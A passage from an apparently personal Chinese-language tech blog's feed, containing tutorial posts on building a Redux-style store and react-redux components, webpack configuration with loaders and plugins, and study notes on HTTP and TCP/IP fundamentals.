if (newAppState === oldAppState) return // 数据没有变化就不渲染了</div><div class="line">  console.log(&apos;render app...&apos;)</div><div class="line">  renderTitle(newAppState.title, oldAppState.title)</div><div class="line">  renderContent(newAppState.content, oldAppState.content)</div><div class="line">&#125;</div><div class="line"></div><div class="line">function renderTitle (newTitle, oldTitle = &#123;&#125;) &#123;</div><div class="line">  if (newTitle === oldTitle) return // 数据没有变化就不渲染了</div><div class="line">  console.log(&apos;render title...&apos;)</div><div class="line">  const titleDOM = document.getElementById(&apos;title&apos;)</div><div class="line">  titleDOM.innerHTML = newTitle.text</div><div class="line">  titleDOM.style.color = newTitle.color</div><div class="line">&#125;</div><div class="line"></div><div class="line">function renderContent (newContent, oldContent = &#123;&#125;) &#123;</div><div class="line">  if (newContent === oldContent) return // 数据没有变化就不渲染了</div><div class="line">  console.log(&apos;render content...&apos;)</div><div class="line">  const contentDOM = document.getElementById(&apos;content&apos;)</div><div class="line">  contentDOM.innerHTML = newContent.text</div><div class="line">  contentDOM.style.color = newContent.color</div><div class="line">&#125;</div><div class="line"></div><div class="line">function stateChanger (state, action) &#123;</div><div class="line">   if (!state) &#123;</div><div class="line">    return &#123;</div><div class="line">      title: &#123;</div><div class="line">        text: &apos;React.js lalalal&apos;,</div><div class="line">        color: &apos;red&apos;,</div><div class="line">      &#125;,</div><div class="line">      content: &#123;</div><div class="line">        text: &apos;React.js content&apos;,</div><div class="line">        color: &apos;blue&apos;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  switch (action.type) &#123;</div><div class="line">    case &apos;UPDATE_TITLE_TEXT&apos;:</div><div class="line">      return &#123; // 构建新的对象并且返回</div><div class="line">        ...state,</div><div class="line">        title: &#123;</div><div class="line">          ...state.title,</div><div class="line">          text: action.text</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    case &apos;UPDATE_TITLE_COLOR&apos;:</div><div class="line">      return &#123; // 构建新的对象并且返回</div><div class="line">        ...state,</div><div class="line">        title: &#123;</div><div class="line">          ...state.title,</div><div class="line">          color: action.color</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    default:</div><div class="line">      return state // 没有修改，返回原来的对象</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">const store = createStore(stateChanger)</div><div class="line">let oldState = store.getState() // 缓存旧的 state</div><div class="line">store.subscribe(() =&gt; &#123;</div><div class="line">  const newState = store.getState() // 数据可能变化，获取新的 state</div><div class="line">  renderApp(newState, oldState) // 把新旧的 state 传进去渲染</div><div class="line">  oldState = newState // 渲染完以后，新的 newState 变成了旧的 oldState，等待下一次数据变化重新渲染</div><div class="line">&#125;)</div><div class="line"></div><div class="line">renderApp(store.getState()) // 首次渲染页面</div><div class="line">store.dispatch(&#123; type: &apos;UPDATE_TITLE_TEXT&apos;, text: &apos;《React.js is so cool!》&apos; &#125;) // 修改标题文本</div><div class="line">store.dispatch(&#123; type: &apos;UPDATE_TITLE_COLOR&apos;, color: &apos;blue&apos; &#125;) // 修改标题颜色</div></pre></td></tr></table></figure></p>
<h1 id="react-redux"><a href="#react-redux" class="headerlink" title="react-redux"></a>react-redux</h1><p>使用Context和redux实现根据共享状态进行子组件渲染的工作</p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/index.js" target="_blank" rel="external">index.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/react-redux.js" target="_blank" rel="external">react-redux.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/ThemeSwitch.js" target="_blank" rel="external">ThemeSwitch.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/Content.js" target="_blank" rel="external">Content.js</a></p>
<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/Header.js" target="_blank" rel="external">Header.js</a></p>
<p>使用真正的react-redux<br>即<br>import { connect } from ‘react-redux’<br>import { createStore } from ‘redux’<br>import { Provider } from ‘react-redux’</p>
<p>根据是否需要高度的复用性，把组件划分为 Dumb 和 Smart 组件，约定俗成地把它们分别放到 components 和 containers 目录下。</p>
<p>Dumb 基本只做一件事情 —— 根据 props 进行渲染。而 Smart 则是负责应用的逻辑、数据，把所有相关的 Dumb（Smart）组件组合起来，通过 props 控制它们。</p>
<p>Smart 组件可以使用 Smart、Dumb 组件；而 Dumb 组件最好只使用 Dumb 组件，否则它的复用性就会丧失。</p>
<p>要根据应用场景不同划分组件，如果一个组件并不需要太强的复用性，直接让它成为 Smart 即可；否则就让它成为 Dumb 组件。</p>
<p>还有一点要注意，Smart 组件并不意味着完全不能复用，Smart 组件的复用性是依赖场景的，在特定的应用场景下是当然是可以复用 Smart 的。而 Dumb 则是可以跨应用场景复用，Smart 和 Dumb 都可以复用，只是程度、场景不一样。</p>
<p>例如将ThemeSwitch拆分成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">/* src/components/ThemeSwitch.js */</div><div class="line">import React, &#123; Component, PropTypes &#125; from &apos;react&apos;</div><div class="line"></div><div class="line">export default class ThemeSwitch extends Component &#123;</div><div class="line">  static propTypes = &#123;</div><div class="line">    themeColor: PropTypes.string,</div><div class="line">    onSwitchColor: PropTypes.func</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  handleSwitchColor (color) &#123;</div><div class="line">    if (this.props.onSwitchColor) &#123;</div><div class="line">      this.props.onSwitchColor(color)</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;button</div><div class="line">          style=&#123;&#123; color: this.props.themeColor &#125;&#125;</div><div class="line">          onClick=&#123;this.handleSwitchColor.bind(this, &apos;red&apos;)&#125;&gt;Red&lt;/button&gt;</div><div class="line">        &lt;button</div><div class="line">          style=&#123;&#123; color: this.props.themeColor &#125;&#125;</div><div class="line">          onClick=&#123;this.handleSwitchColor.bind(this, &apos;blue&apos;)&#125;&gt;Blue&lt;/button&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* src/containers/ThemeSwitch.js */</div><div class="line"></div><div class="line">import &#123; connect &#125; from &apos;react-redux&apos;</div><div class="line">import ThemeSwitch from &apos;../components/ThemeSwitch&apos;</div><div class="line"></div><div class="line">const mapStateToProps = (state) =&gt; &#123;</div><div class="line">  return &#123;</div><div class="line">    themeColor: state.themeColor</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">const mapDispatchToProps = (dispatch) =&gt; &#123;</div><div class="line">  return &#123;</div><div class="line">    onSwitchColor: (color) =&gt; &#123;</div><div class="line">      dispatch(&#123; type: &apos;CHANGE_COLOR&apos;, themeColor: color &#125;)</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">export default connect(mapStateToProps, mapDispatchToProps)(ThemeSwitch)</div></pre></td></tr></table></figure></p>
<p><a href="http://huziketang.com/books/react/lesson1" target="_blank" rel="external">学习资料链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;react.js是一个UI库,按照react规则，可以组建页面里每一小块的功能，这种局部的功能就是一个组件，&lt;br&gt;各组件之间可以组合、嵌套，从而拼成整个页面&lt;br&gt;react就是在组建各个尽可能通用的组件&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于webpack</title>
    <link href="http://yoohannah.github.io/post/knowledge/webpack.html"/>
    <id>http://yoohannah.github.io/post/knowledge/webpack.html</id>
    <published>2017-10-08T10:37:02.000Z</published>
    <updated>2017-12-28T00:18:26.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>1.webpack工作内容<br>Webpack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。<br>2.webpack工作方式<br>把你的项目当做一个整体，通过一个给定的主文件（如：index.js），Webpack将从这个文件开始找到你的项目的所有依赖文件，使用loaders,plugins处理它们，最后打包为一个（或多个）浏览器可识别的JavaScript文件。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.如果在nodejs中全局安装了webpack和webpack-dev-server,可以在git bash直接使用’webpack’命令进行打包，使用’webpack-dev-server’命令启动打包后生成的项目<br>2.在打包之前,要先配置webpack.config.js文件,’webpack’命令会根据webpack.config.js文件的配置项去打包文件<br>3.如果想使用不同的配置文件去打包项目，可以使用’webpack –config 文件名’命令去打包<br>4.如果不想带文件名去打包,可以在package.json的scripts对象中配置命令‘xxx’,然后在git bash中使用命令‘npm run xxx’进行打包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&quot;scripts&quot;: &#123;</div><div class="line">    &quot;start&quot;: &quot;webpack-dev-server&quot;,</div><div class="line">    &quot;build&quot;: &quot;webpack --config webpack.config.build.js&quot;,</div><div class="line">    &quot;dev&quot;:&quot;webpack --config webpack.config.dev.js&quot;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>执行 npm run build 则按照webpack.config.build.js文件配置的内容去打包<br>同样，执行 npm run dev 则按照webpack.config.dev.js文件配置的内容去打包<br>但要注意,使用配置命令’start’时，直接执行’npm start’，就可以执行其对于的命令，中间不需要加run</p>
<h1 id="webpack-config-js-配置"><a href="#webpack-config-js-配置" class="headerlink" title="webpack.config.js 配置"></a>webpack.config.js 配置</h1><p>module.exports = {}<br>1.配置根路径<br>配置入口文件前，可以用context配置根路径，这样在配置时，就不用将文件路径写进去，直接将文件配置进去就可以了<br>可以借助path模块拼接路径字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">const path = require(&apos;path&apos;)</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">  /**</div><div class="line">   * The base directory</div><div class="line">   */</div><div class="line">  context: path.join(__dirname, &apos;./src&apos;),//这样入口文件就是指src文件夹下面的那些文件</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>2.入口文件<br>入口文件是指打包后项目生成的可以访问的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//单入口：</div><div class="line"> entry: &apos;./index.js&apos;,/*打包单个文件*/</div><div class="line"> entry: [&apos;./index1.js&apos;,&apos;./index2.js&apos;],/*打包多个文件*/</div><div class="line"></div><div class="line">//多入口：</div><div class="line">entry: &#123;</div><div class="line">    home: &apos;./home&apos;,</div><div class="line">    user: [&apos;./user&apos;, &apos;./account&apos;]</div><div class="line">  &#125;,</div></pre></td></tr></table></figure></p>
<p>多入口文件数组的KEY值可用于命名输出文件名，其对应的值即是要打包的源文件</p>
<p>3.输出文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">output: &#123;</div><div class="line"></div><div class="line">/* filename方式一：直接指定文件名*/</div><div class="line">    filename: &apos;bundle.js&apos;,</div><div class="line"></div><div class="line">/* filename方式二：映射变量[name]和[hash]，[name]即定义入口文件的key值，[hash]是webpack在打包的时候按照一定规则生成的值,是MD5加密的值</div><div class="line"> * 还可以加[chunkhash],这里是作为版本号使用，方便上线时静态资源的版本管理</div><div class="line"> * 单入口[name]被映射成‘main’</div><div class="line">*/</div><div class="line">    filename: &apos;[name].bundle.[hash].js&apos;,</div><div class="line"></div><div class="line">    path: &apos;/home/proj/public/assets&apos;，/*指定输入文件存放路径*/</div><div class="line">    libraryTarget：</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p><a href="http://www.css88.com/doc/webpack2/concepts/output/" target="_blank" rel="external">其他配置参数</a></p>
<p>4.配置加载器loader</p>
<p>loader 是对应用程序中资源文件进行转换。它们是（运行在 Node.js 中的）函数，可以将资源文件作为参数的来源，然后返回新的资源文件。<br><a href="https://webpack.js.org/loaders/" target="_blank" rel="external">官方可用loader</a></p>
<p>Loaders的配置包括以下几方面：<br>test：一个用以匹配loaders所处理文件的拓展名的正则表达式（必须）<br>loader：loader的名称（必须）<br>include/exclude:手动添加必须处理的文件（文件夹）或屏蔽不需要处理的文件（文件夹）（可选）；<br>query：为loaders提供额外的设置选项（可选）</p>
<p>loader被配置在rules数组中，数组每一个对象可配置一个或多个loader<br>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">module: &#123;</div><div class="line">   rules: [</div><div class="line">     &#123;</div><div class="line">       test: /\.js$/,</div><div class="line">       include: path.join(__dirname, &apos;./src&apos;),</div><div class="line">       use: &apos;babel-loader&apos;</div><div class="line">     &#125;</div><div class="line">   ]</div><div class="line"> &#125;,</div></pre></td></tr></table></figure></p>
<p>常用loader:<br>babel-loader:编译js,考虑到babel具有非常多的配置选项,一般把babel的配置选项放在一个单独的名为 “.babelrc” 的配置文件中<br>css-loader:使你能够使用类似@import 和 url(…)的方法实现 require()的功能,获取css文件里面的样式<br>style-loader:将css样式插件js文件，与css-loader一起使用能够把样式表嵌入webpack打包后的JS文件中<br>autoprefixer-loader:自动添加前缀，使css文件更有兼容性<br>postcss-loader:css会自动根据Can i use里的数据添加不同前缀，可与autoprefixer-loader结合使用<br>ExtractTextPlugin.extract:将css单独打包成一个.css文件，使用这个插件，需要require 插件extract-text-webpack-plugin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">//配置代码：</div><div class="line">1.</div><div class="line"> module: &#123;</div><div class="line">    rules: [</div><div class="line">      &#123;</div><div class="line">        test: /\.css$/,</div><div class="line">        include: [</div><div class="line">          path.join(__dirname, &apos;./src&apos;)</div><div class="line">        ],</div><div class="line">        use: [&apos;style-loader&apos;, &apos;css-loader&apos;]</div><div class="line">      &#125;</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">2.</div><div class="line">module: &#123;</div><div class="line">    rules: [&#123;</div><div class="line">      test: /\.css$/,</div><div class="line">      include: [</div><div class="line">       path.join(__dirname, &apos;./src&apos;),</div><div class="line">      ],</div><div class="line">      use: ExtractTextPlugin.extract(&#123;</div><div class="line">        fallback: &apos;style-loader&apos;,</div><div class="line">        use: &apos;css-loader&apos;</div><div class="line">      &#125;)</div><div class="line">    &#125;]</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">plugins: [</div><div class="line">    new ExtractTextPlugin(&apos;[name].css&apos;)</div><div class="line">  ]</div><div class="line">3.</div><div class="line">module: &#123;</div><div class="line">    rules: [&#123;</div><div class="line">      test: /\.css$/,</div><div class="line">      include: [</div><div class="line">       path.join(__dirname, &apos;./src&apos;)</div><div class="line">      ],</div><div class="line">      use: ExtractTextPlugin.extract(&#123;</div><div class="line">        fallback: &apos;style-loader&apos;,</div><div class="line">        use: [&apos;css-loader&apos;, &apos;autoprefixer-loader&apos;]</div><div class="line">      &#125;)</div><div class="line">    &#125;]</div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    new ExtractTextPlugin(&apos;[name].css&apos;)</div><div class="line">  ]</div></pre></td></tr></table></figure></p>
<p>5.配置插件plugin<br>插件目的在于解决 loader 无法实现的其他事,配置插件都在plugin数组中，数组每一项就是new一个plugin,插件的配置也在new时以参数形式传递进去<br>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">plugins: [</div><div class="line">    new CommonsChunkPlugin(&#123;</div><div class="line">      name: &apos;commons&apos;,</div><div class="line">      filename: &apos;commons.js&apos;</div><div class="line">    &#125;),</div><div class="line">    new ExtractTextPlugin(&apos;[name].css&apos;)</div><div class="line">  ]</div></pre></td></tr></table></figure></p>
<p>常用插件：<br>CommonsChunkPlugin：将多个文件通用的东西打包成一个文件<br>webpack.optimize.CommonsChunkPlugin：require(‘webpack’),使用webpack的optimize.CommonsChunkPlugin将打包的文件转化为公共文件<br>HtmlWebpackPlugin：是依据一个简单的index.html模板，生成一个自动引用你打包后的JS文件的新index.html。这在每次生成的js文件名称不同时非常有用（比如添加了hash值）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">var path = require(&apos;path&apos;)</div><div class="line">var webpack = require(&apos;webpack&apos;)</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">  context: path.join(__dirname, &apos;./src&apos;),</div><div class="line">  entry: &#123;</div><div class="line">    app: &apos;./&apos;,</div><div class="line">    vendor: [&apos;jquery&apos;, &apos;underscore&apos;],//将文件中require的&apos;jquery&apos;, &apos;underscore&apos;打包成公共文件vendor.bundle.js</div><div class="line">  &#125;,</div><div class="line">  output: &#123;</div><div class="line">    path: path.join(__dirname, &apos;dist&apos;),</div><div class="line">    filename: &apos;bundle.js&apos;</div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    new webpack.optimize.CommonsChunkPlugin(&#123;</div><div class="line">      name: &apos;vendor&apos;,</div><div class="line">      filename: &apos;vendor.bundle.js&apos;</div><div class="line">    &#125;)</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><a href="http://www.jianshu.com/p/42e11515c10f" target="_blank" rel="external">入门Webpack</a></p>
<h1 id="写一个webpack-的loader"><a href="#写一个webpack-的loader" class="headerlink" title="写一个webpack 的loader"></a>写一个webpack 的loader</h1><p><a href="https://webpack.js.org/development/how-to-write-a-loader/" target="_blank" rel="external">How to write a loader</a><br><a href="https://webpack.js.org/api/loaders/" target="_blank" rel="external">loader API</a></p>
<h1 id="写一个webpack-的plugin"><a href="#写一个webpack-的plugin" class="headerlink" title="写一个webpack 的plugin"></a>写一个webpack 的plugin</h1><h1 id="gulp"><a href="#gulp" class="headerlink" title="gulp"></a>gulp</h1><p>api:<br>task：<br>src:<br>watch：用来监视文件的变化；</p>
<p>jshint：js 代码检查<br>uglify：压缩js<br>minify-css:压缩css<br>minfy-html:压缩html<br>concat:合并文件</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h1&gt;&lt;p&gt;1.webpack工作内容&lt;br&gt;Webpack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于HTTP</title>
    <link href="http://yoohannah.github.io/post/knowledge/http.html"/>
    <id>http://yoohannah.github.io/post/knowledge/http.html</id>
    <published>2017-10-05T14:53:37.000Z</published>
    <updated>2018-01-01T13:43:09.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在浏览器的地址栏输入url后发生了什么"><a href="#在浏览器的地址栏输入url后发生了什么" class="headerlink" title="在浏览器的地址栏输入url后发生了什么"></a>在浏览器的地址栏输入url后发生了什么</h1><p> 粗略的回答的话，就是浏览器向服务器发送该url,浏览器根据该url找到相应的资源，再把资源返回给浏览器，即使我们看到的页面内容<br> 细致的回答的话，浏览器会在应用层利用DNS协议解析域名生成ip地址，利用http协议生成一个http请求然后传递给传输层，传输层将根据TCP协议将这个http请求报文进行分割并打上序号标记、端口号和三次握手标志后转发给网络层，网络层会利用ARP协议根据ip地址查到MAC地址,IP协议对数据封装MAC地址等信息，将打包好的数据包发送给链路层再封装然后发送出去，经过一系列转发，忽略路由、CDN的缓存策略，中转到达服务器后,服务器再按链路层，网路层，传输层，应用层的顺序，从下到上依次解封数据信息，找到资源后，同样分割，封装打包再传给客户端浏览器。</p>
<h1 id="关于-TCP-IP-协议"><a href="#关于-TCP-IP-协议" class="headerlink" title="关于 TCP/IP 协议"></a>关于 TCP/IP 协议</h1><p>1.不同的硬件、操作系统之间的通信，所有这一切都需要一种规则，这种规则即协议<br>2.与互联网相关联的协议集合起来就是TCP/IP<br>3.http协议是TCP/IP协议的一个子集<br>4.URI(统一资源标识符)，用字符串标识某一互联网资源，而url表示资源的地点</p>
<h2 id="分层管理"><a href="#分层管理" class="headerlink" title="分层管理"></a>分层管理</h2><p>好处:局部改变设计，只需把变动的层替换，无需整体替换<br>应用层：应用服务间通信，如FTP,DNS服务，应用http协议<br>传输层：网络连接中两台计算机之间数据传输，应用TCP和UDP协议<br>网络层：处理网络上流动的数据包，应用IP协议<br>链路层：处理连接网络的硬件之间通信，包括操作系统，硬件的设备驱动，光纤等。</p>
<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><p>目的在于确保准确无误的将数据送达目的地<br>TCP协议在封装数据时会封装SYN和ACK作为握手标识<br>发送端首先发送一个带SYN标识的数据包给对方，接收端收到后，回传一个带有SYN/ACK标识的数据包以示传达确认信息，最后，发送端再回传一个带ACK标识的数据包，代表‘握手’结束<br>若在握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包</p>
<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>1.请求报文由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成<br>2.响应报文基本上由协议版本、状态码(表示请求成功或失败的数字代码)、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成<br>3.http是无状态协议，即不保存之前发送过的请求或响应<br>4.持久链接的特点：只要任意一端没有明确提出断开连接，则保持TCP连接状态，<br>旨在建立1次TCP连接后进行多次请求和响应的交互<br>5.管线化技术：在持久链接状态下，不用等待响应亦可直接发送下一个请求，实现并行发送多个请求<br>6.请求方法<br>GET:访问已被URI识别的资源,获取响应内容<br>POST：传输实体的主体<br>PUT：在请求报文主体中包含文件内容，然后保存到请求URI指定的位置，自身不带验证机制<br>HEAD:用于确认URI的有效性及资源更新的日期时间等<br>DELETE：按请求URI删除指定的资源，不带验证机制<br>OPTION：查询针对请求URI指定的资源支持的方法<br>TRACE: 将之前的请求通信环回给客户端,可以查询发送出去的请求是怎样被加工修改/篡改的，但容易引发XST攻击<br>CONNECT：在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL和TLS协议把通信内容加密后经网络隧道传输</p>
<h2 id="COOKIE状态管理"><a href="#COOKIE状态管理" class="headerlink" title="COOKIE状态管理"></a>COOKIE状态管理</h2><p>客户端在未携带cookie信息状态下请求服务器时，服务器会生成cookie，并记住是向谁发送的，然后在响应报文头中添加一个叫Set-Cookie的字段信息，通知客户端保存Cookie。<br>当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去<br>服务器端发现客户端发送过来的Cookie后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息.<br>7.报文由报文首部、空格和报文主体构成</p>
<p>请求报文的报文首部分为：请求行(请求方法,URI,HTTP版本)、请求首部字段、通用首部字段、实体首部字段、其他<br>响应报文的报文首部分为：状态行(状态码,原因短语,HTTP版本)、响应首部字段、通用首部字段、实体首部字段、其他</p>
<p>报文主体即传输请求或响应的实体主体</p>
<p>提升传输效率采取的方法：传输编码，对实体进行‘内容编码’，压缩传输内容，分块传输编码</p>
<p>发送不同类型数据时，需要首部字段Content-Type<br>请求报文的Content-Type赋值mulitipart/form-data,<br>响应报文的Content-Type赋值mulitipart/byteranges,</p>
<p>请求指定范围数据时，可以用首部字段Range指定资源的byte范围<br>例：请求开始到3000，和5000到7000字节的多重范围<br>Range:bytes=-3000,5000-7000<br>响应状态码会返回206，多重范围会在首部添加Content-Type：mulitipart/byteranges<br>如果服务器无法响应范围请求，则会返回状态码200OK和完整的实体内容</p>
<p>内容协商机制：客户端和服务端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。<br>内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准<br>对应首部字段有：Accept,Accept-Charset,Accept-Encoding,Accept-Language,Content-Language<br>内容协商技术有三类：<br>服务器驱动协商：以请求首部字段为参考，在服务器端自动处理<br>客户端驱动协商：用户在浏览器可选列表中手动选择<br>透明协商：前两者的结合体，由服务端和客户端各自进行内容协商的一种方法</p>
<p>8.状态码</p>
<p>1XX:请求正在处理<br>2XX:请求正常那个处理完毕<br>3XX：重定向，需要进行附加操作以完成请求，<br>4XX：服务器无法处理请求,客户端有错误发生<br>5XX：服务器处理请求出错</p>
<p>200 OK 客户端的请求在服务器被正常处理了<br>204 No Content ，正常处理，但响应不含实体<br>206 Partial Content  成功处理了范围请求，响应只含指定范围实体</p>
<p>301 Moved Permanently 永久重定向<br>302 Found 临时重定向<br>303 See Other 临时重定向，但只能使用get方法访问该资源<br>304 Not Modified 服务器没有找到符合客户端附带条件(If-Match,If-Range等报文首部)的资源，响应不含主体，与重定向无关,服务器告诉客户，原来缓冲的文档还可以继续使用<br>307 Temporary Redirect 临时重定向，按照浏览器标准不会从post变成GET。但浏览器不同，出现情况也可能不同</p>
<p>400 Bad Request 请求报文存在语法错误<br>401 Unauthorized 携带信息未通过HTTP认证，没有权限访问资源<br>403 Forbidden 请求的资源被服务器拒绝访问<br>404 Not Found 无法找到请求资源</p>
<p>500 Internal Server Error 服务器在执行请求时发生了错误，也可能是web应用存在bug或临时故障<br>503 Service Unavailable 服务器暂时处于超负载或正在进行停机维护</p>
<p>9.通信数据转发程序<br>代理：接收客户端请求并转发给源服务器，不改变URI,但在转发时会添加via首部<br>好处：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的等等<br>使用方法分两类：<br>1.是否使用缓存,例,缓存代理(预先将资源副本存在代理服务器上);<br>2.是否会修改报文,例,透明代理(对报文不做任何加工，反之非透明代理)</p>
<p>网关：转发其他服务器数据的服务器，接收从客户端发来的请求并对请求进行处理<br>好处：能使通信线路上服务器提供非HTTP协议服务，能提高通信安全性</p>
<p>隧道：在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序<br>目的：确保客户端能与服务器进行安全的通信，通信双发断开连接时结束</p>
<p>缓存：代理服务器或客户端本地磁盘内保存的资源副本 ，其实相当于是一种代理服务器<br>目的：减少对源服务器的访问，从而节省通信流量和通信时间<br>机制：超过有效期之后，会向源服务器确认资源有效性，若判断缓存失效，则再次从源服务器上获取‘新’资源</p>
<p>10.首部字段<br>分两类：缓存代理和非缓存代理<br>缓存代理，即端到端首部，这类首部会被带到客户端或服务端，且会保存在缓存中<br>非缓存代理，即逐跳首部，只对单词转发有效，会因通过缓存或代理而不再转发</p>
